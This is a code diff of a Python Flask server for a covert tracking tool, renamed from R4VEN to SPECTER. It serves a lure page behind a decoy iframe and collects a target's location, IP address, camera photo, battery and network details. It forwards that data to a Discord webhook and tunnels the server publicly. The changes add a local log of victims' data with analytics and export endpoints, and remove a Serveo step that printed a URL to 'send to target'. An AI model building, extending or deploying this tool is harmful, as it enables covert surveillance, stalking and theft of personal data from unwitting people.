@@ -1,18 +1,18 @@
-import sys
-import requests
-import os
-import socket
-import subprocess
-import threading
-import logging
-import requests
 import argparse
-import re
-import time
-from flaredantic import FlareTunnel, FlareConfig
-from flask import Flask, request, Response, send_from_directory
+import json
+import logging
+import os
 import signal
-from utils import get_file_data, update_webhook, check_and_get_webhook_url
+import socket
+import sys
+import threading
+import time
+
+import requests
+from flaredantic import FlareConfig, FlareTunnel
+from flask import Flask, Response, request, send_from_directory
+
+from utils import check_and_get_webhook_url, get_file_data, update_webhook
 
 # Global flag to handle graceful shutdown
 shutdown_flag = threading.Event()
@@ -33,12 +33,16 @@ else:
 app = Flask(__name__)
 
 parser = argparse.ArgumentParser(
-    description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
+    description="SPECTER - Track device location, and IP address, and capture a photo with device details.",
     usage=f"{sys.argv[0]} [-t target] [-p port]"
 )
 parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
 parser.add_argument("-p", "--port", nargs="?", help="port to listen on", type=int, default=8000)
 args = parser.parse_args()
+
+# Website URL file for iframe
+WEBSITE_URL_FILE = "website_url.txt"
+
 
 def should_exclude_line(line):
     # Add patterns of lines you want to exclude
@@ -46,6 +50,7 @@ def should_exclude_line(line):
         "HTTP request"
     ]
     return any(pattern in line for pattern in exclude_patterns)
+
 
 @app.route("/", methods=["GET"])
 def get_website():
@@ -56,16 +61,26 @@ def get_website():
         pass
     return Response(html_data, content_type="text/html")
 
+
 @app.route("/dwebhook.js", methods=["GET"])
 def get_webhook_js():
     return send_from_directory(directory=os.getcwd(), path=DISCORD_WEBHOOK_FILE_NAME)
 
-@app.route("/location_update", methods=["POST"])
+
+@app.route('/location_update', methods=["POST"])
 def update_location():
     data = request.json
     discord_webhook = check_and_get_webhook_url(os.getcwd())
+    
+    # Log metrics to local file for analysis
+    if data:
+        metrics_file = 'metrics.log'
+        with open(metrics_file, 'a') as f:
+            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {json.dumps(data)}\n")
+    
     update_webhook(discord_webhook, data)
     return "OK"
+
 
 @app.route('/image', methods=['POST'])
 def image():
@@ -80,11 +95,106 @@ def image():
 
     return Response("%s saved and sent to Discord webhook" % f)
 
+
 @app.route('/get_target', methods=['GET'])
 def get_url():
     return args.target
 
-#run_flask function to handle threading
+
+@app.route('/get_website', methods=['GET'])
+def get_website_url():
+    """Get the website URL to display in iframe"""
+    try:
+        with open(WEBSITE_URL_FILE, 'r') as f:
+            website_url = f.read().strip()
+            if website_url:
+                return website_url
+    except FileNotFoundError:
+        pass
+    return "https://www.wikipedia.org"
+
+
+@app.route('/analytics', methods=['GET'])
+def get_analytics():
+    """Get analytics summary from metrics.log"""
+    try:
+        metrics_file = 'metrics.log'
+        if not os.path.exists(metrics_file):
+            return {"status": "no_data", "message": "No metrics collected yet"}
+        
+        with open(metrics_file, 'r') as f:
+            lines = f.readlines()
+        
+        # Parse metrics
+        battery_data = []
+        network_data = []
+        session_data = []
+        
+        for line in lines:
+            try:
+                parts = line.split(' - ', 1)
+                if len(parts) == 2:
+                    timestamp, json_data = parts
+                    data = json.loads(json_data.strip())
+                    
+                    # Check for embeds to identify metric type
+                    if 'embeds' in data and data['embeds']:
+                        title = data['embeds'][0].get('title', '')
+                        if 'Battery' in title:
+                            battery_data.append(data)
+                        elif 'Connection' in title:
+                            network_data.append(data)
+                        elif 'Session' in title:
+                            session_data.append(data)
+            except (json.JSONDecodeError, ValueError, IndexError):
+                continue
+        
+        return {
+            "status": "success",
+            "total_entries": len(lines),
+            "battery_readings": len(battery_data),
+            "network_readings": len(network_data),
+            "sessions": len(session_data),
+            "latest_metrics": {
+                "battery": battery_data[-1] if battery_data else None,
+                "network": network_data[-1] if network_data else None,
+                "session": session_data[-1] if session_data else None
+            }
+        }
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+
+@app.route('/metrics/export', methods=['GET'])
+def export_metrics():
+    """Export metrics as JSON"""
+    try:
+        metrics_file = 'metrics.log'
+        if not os.path.exists(metrics_file):
+            return {"status": "no_data"}
+        
+        with open(metrics_file, 'r') as f:
+            lines = f.readlines()
+        
+        metrics = []
+        for line in lines:
+            try:
+                parts = line.split(' - ', 1)
+                if len(parts) == 2:
+                    timestamp, json_data = parts
+                    metrics.append({
+                        "timestamp": timestamp.strip(),
+                        "data": json.loads(json_data.strip())
+                    })
+            except (json.JSONDecodeError, ValueError):
+                continue
+        
+        return {"status": "success", "metrics": metrics}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+
+# run_flask function to handle threading
 def run_flask(folder_name):
     try:
         os.chdir(folder_name)
@@ -105,14 +215,17 @@ def run_flask(folder_name):
         print(f"{R}Flask server terminated.{W}")
         shutdown_flag.set()
 
+
 def signal_handler(sig, frame):
     """Handles termination signals like CTRL+C."""
     print(f"{R}Exiting...{W}")
     shutdown_flag.set()  # Set the shutdown flag to terminate threads
     sys.exit(0)
 
+
 # Attach signal handler for CTRL+C
 signal.signal(signal.SIGINT, signal_handler)
+
 
 # Cloudflare tunnel with non-blocking handling
 def run_tunnel():
@@ -123,7 +236,7 @@ def run_tunnel():
         )
         with FlareTunnel(config) as tunnel:
             print(f"{G}[+] Flask app available at: {C}{tunnel.tunnel_url}{W}")
-            
+
             # Keep the main thread running to monitor the shutdown flag
             while not shutdown_flag.is_set():
                 time.sleep(0.5)
@@ -131,65 +244,35 @@ def run_tunnel():
         logging.error(f"Error in Cloudflare tunnel: {e}")
         print(f"{R}Error: {e}{W}")
 
-# Serveo
-def start_port_forwarding():
+
+def get_local_ip():
     try:
-        command = ["ssh", "-R", f"80:localhost:{args.port}", "serveo.net"]
-        logging.info("Starting port forwarding with command: %s", " ".join(command))
-        
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
-        url_printed = False
-        for line in process.stdout:
-            line = line.strip()
-            if line:
-                if "Forwarding HTTP traffic from" in line and not url_printed:
-                    url = line.split(' ')[-1]
-                    formatted_url_message = (
-                        f"\n{M}[+] {C}Send This URL To Target: {G}{url}{W}\n {R}Don't close this window!{W}")
-                    print(formatted_url_message)
-                    logging.info(formatted_url_message)
-                    url_printed = True
-                elif not should_exclude_line(line):
-                    logging.info(line)
-                    print(line)
-        
-        for line in process.stderr:
-            line = line.strip()
-            if line:
-                if not should_exclude_line(line):
-                    logging.error(line)
-                    print(line)
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            sock.connect(("8.8.8.8", 80))
+            return sock.getsockname()[0]
+    except OSError:
+        try:
+            hostname = socket.gethostname()
+            addresses = socket.gethostbyname_ex(hostname)[2]
+            for address in addresses:
+                if not address.startswith("127."):
+                    return address
+        except OSError:
+            pass
+    return None
 
-    except Exception as e:
-        print(f"An error occurred while using Serveo: {e}", "error")
 
-# Function to check if Serveo is up
-def is_serveo_up():
-    print(f"\n{B}[?] {C}Checking if {Y}Serveo.net{W} is up for port forwarding...{W}", end="", flush=True)
-    try:
-        response = requests.get("https://serveo.net", timeout=3)
-        if response.status_code == 200:
-            print(f" {G}[UP]{W}")
-            return True
-    except requests.RequestException:
-        pass
-    print(f" {R}[DOWN]{W}")
-    return False
+def print_local_access_links(port):
+    local_host_url = f"http://127.0.0.1:{port}/"
+    print(f"{B}[+] {C}Local host link: {W}{local_host_url}")
 
-# User choice
-def ask_port_forwarding():
-    serveo_status = "Site is Up" if is_serveo_up() else "Down! Currently not working"
-    print(f'____________________________________________________________________________\n')
-    print(f"{B}[~] {C}Choose port forwarding?{W}\n")
-    print(f"{Y}1. {W}serveo ({R}{serveo_status}{W})")
-    print(f"{Y}2. {W}cloudflare {G}(recommended)")
-    print(f"{Y}3. {W}None, I will use another method")
-    print(f"\n{M}Note:{R} If 1,2 does not work..{W}Use option {G}3{W} and port forward manually using tool like Ngrok\n")
-    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
-    return choice
+    local_ip = get_local_ip()
+    if local_ip:
+        local_ip_url = f"http://{local_ip}:{port}/"
+        print(f"{B}[+] {C}Local IP link: {W}{local_ip_url}")
+    else:
+        print(f"{Y}[!] {W}Could not detect a local IP address for LAN access.")
 
-#print(f"\n{B}[?] {C}Checking if {port} is available...{W}", end="", flush=True)
 
 # Port check
 def is_port_available(port):
